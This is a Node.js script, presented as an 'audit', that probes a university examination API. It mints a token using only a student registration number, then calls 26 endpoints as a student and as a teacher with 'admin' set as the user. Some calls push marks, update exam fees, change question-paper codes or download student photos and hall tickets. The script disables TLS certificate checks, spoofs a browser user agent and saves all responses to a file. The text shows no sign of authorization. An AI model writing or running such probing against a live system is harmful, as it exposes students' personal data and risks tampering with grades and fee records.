const fs = require('fs');
const https = require('https');

const ACTIONS = [
    "getProfileDet", "getToken", "apitest", "getStudentProfile", 
    "getStudentSubject", "getStudSubIa", "getStudRes", "pushStudExamFee", 
    "updateStudExamFee", "downloadStudPhoto", "downloadStudHalltiket", 
    "downloadStudHall", "sduvaldata", "genrateToken", "getStudAttDet", 
    "updateqpcode", "genrateTokennew", "getEsubject", "getStudSubEligble", 
    "midendtermmarkspush", "createAssessmentSchema", "pushSchmaMarks", 
    "getmasteach", "getteachsub", "getMarksPushStatus", "getSchemeStatus"
];

const BASE_URL = "https://coe.pgi-intraconnect.in/pubapi/app.php";
const UNIV_CODE = "064";
const TEST_REGNO = "20241BCI0249";
const TEST_TEACHER = "PUNIV02237";

const DELAY_MS = 600;
const OUTPUT_FILE = "src/app/coe_audit_pubapi_results.json";

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

// Categorization Logic
const CATEGORIES = {
    AUTH: ["getToken", "genrateToken", "genrateTokennew"],
    DOWNLOAD: ["downloadStudPhoto", "downloadStudHalltiket", "downloadStudHall"],
    TEACHER: ["getmasteach", "getteachsub", "updateqpcode", "midendtermmarkspush", "createAssessmentSchema", "pushSchmaMarks"],
    SYSTEM: ["apitest", "getMarksPushStatus", "getSchemeStatus", "getEsubject", "sduvaldata"],
    STUDENT: ["getProfileDet", "getStudentProfile", "getStudentSubject", "getStudSubIa", "getStudRes", "pushStudExamFee", "updateStudExamFee", "getStudAttDet", "getStudSubEligble"]
};

function getCategory(action) {
    for (const [cat, actions] of Object.entries(CATEGORIES)) {
        if (actions.includes(action)) return cat;
    }
    return "STUDENT";
}

function getPayload(action) {
    const cat = getCategory(action);
    if (cat === "TEACHER") {
        return { 
            fteachcode: TEST_TEACHER, 
            fdeptcode: "CSE", 
            fcollcode: "1",
            fyear: "2024",
            fexamno: "1",
            fuser: "admin"
        };
    }
    if (cat === "SYSTEM") {
        return { fyear: "2024", fexamno: "1", univcode: UNIV_CODE, fcollcode: "1", fdeptcode: "CSE" };
    }
    if (cat === "AUTH") {
        return { fregno: TEST_REGNO, fregpno: TEST_REGNO, univcode: UNIV_CODE, regno: TEST_REGNO };
    }
    if (cat === "DOWNLOAD") {
        return { fregno: TEST_REGNO, fregpno: TEST_REGNO, fexamno: "1", fyear: "2024", univcode: UNIV_CODE };
    }
    // Deep Student Metadata with all known variants
    return {
        regno: TEST_REGNO,
        fregno: TEST_REGNO,
        fregpno: TEST_REGNO,
        fsubcode: "PSY1001",
        fsubid: "PSY1001",
        fcollcode: "1",
        fyear: "2024",
        fexamno: "1",
        term: "S1",
        programLevel: "UG"
    };
}

async function getFreshToken() {
    const tokenUrl = `${BASE_URL}?a=genrateTokennew&univcode=${UNIV_CODE}&regno=${TEST_REGNO}`;
    return new Promise((resolve, reject) => {
        https.get(tokenUrl, (res) => {
            let data = '';
            res.on('data', d => data += d);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    if (json.data && json.data.token) resolve(json.data.token);
                    else reject("Failed to parse token from response");
                } catch (e) {
                    reject("Failed to fetch fresh token");
                }
            });
        }).on('error', reject);
    });
}

async function fetchEndpoint(action, token) {
    const cat = getCategory(action);
    const params = getPayload(action);
    
    // MIXED DELIVERY: Put everything in URL query string AND POST body
    let url = `${BASE_URL}?a=${action}&univcode=${UNIV_CODE}`;
    Object.entries(params).forEach(([k, v]) => {
        url += `&${k}=${encodeURIComponent(v)}`;
    });

    const isGet = cat === "AUTH" || cat === "DOWNLOAD";

    const options = {
        method: isGet ? 'GET' : 'POST',
        headers: {
            'Authorization': `Bearer ${token}`,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
    };

    if (!isGet) {
        options.headers['Content-Type'] = 'application/json';
    }

    return new Promise((resolve) => {
        const req = https.request(url, options, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    resolve({ action, params, category: cat, status: "SUCCESS", data: json });
                } catch (e) {
                    resolve({ action, params, category: cat, status: "FAILURE", error: "Not JSON", raw: data.substring(0, 500) });
                }
            });
        });
        
        req.on('error', (err) => {
            resolve({ action, params, category: cat, status: "ERROR", error: err.message });
        });

        if (!isGet) {
            req.write(JSON.stringify([params]));
        }
        req.end();
    });
}

async function runAudit() {
    console.log("--- Presidency COE Advanced Audit ---");
    console.log("Generating fresh authorization token...");
    let token;
    try {
        token = await getFreshToken();
        console.log(`Token acquired: ${token.substring(0, 20)}...`);
    } catch (e) {
        console.error("Critical Error: Could not acquire token.", e);
        return;
    }

    const results = [];
    console.log(`Starting targeted audit of ${ACTIONS.length} pubapi endpoints...\n`);

    for (let i = 0; i < ACTIONS.length; i++) {
        const action = ACTIONS[i];
        const cat = getCategory(action);
        process.stdout.write(`[${i + 1}/${ACTIONS.length}] [${cat}] Auditing: ${action}... `);
        
        const result = await fetchEndpoint(action, token);
        results.push(result);
        
        if (result.status === "SUCCESS") {
            const hasData = result.data?.data || result.data?.status === "success";
            console.log(hasData ? "\x1b[32mSUCCESS\x1b[0m" : "\x1b[33mRESTRICTED\x1b[0m");
        } else {
            console.log("\x1b[31mFAILURE\x1b[0m");
        }

        if ((i + 1) % 5 === 0) {
            fs.writeFileSync(OUTPUT_FILE, JSON.stringify(results, null, 2));
        }

        await new Promise(resolve => setTimeout(resolve, DELAY_MS));
    }

    fs.writeFileSync(OUTPUT_FILE, JSON.stringify(results, null, 2));
    console.log(`\nAudit complete! Results saved directly to ${OUTPUT_FILE}`);
}

runAudit();

